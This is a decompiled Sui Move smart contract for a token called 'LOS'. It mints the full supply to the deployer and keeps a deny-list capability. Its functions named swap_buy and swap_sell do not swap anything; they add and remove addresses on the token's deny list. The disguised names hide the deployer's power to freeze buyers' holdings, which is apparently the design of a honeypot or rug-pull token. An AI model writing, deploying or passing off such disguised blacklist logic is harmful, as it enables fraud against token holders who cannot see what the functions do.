module 0x21afb3fdb97a7cc04b993958b16da3202b87da5b6343ea1a12bf43ad1be3e1ad::los {
    struct LOS has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: LOS, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<LOS>(arg0, 9, b"LOS", b"Los on Sol", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://i.imgur.com/rXJRSJm.jpeg"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<LOS>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<LOS>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<LOS>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<LOS>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<LOS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<LOS>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<LOS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<LOS>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

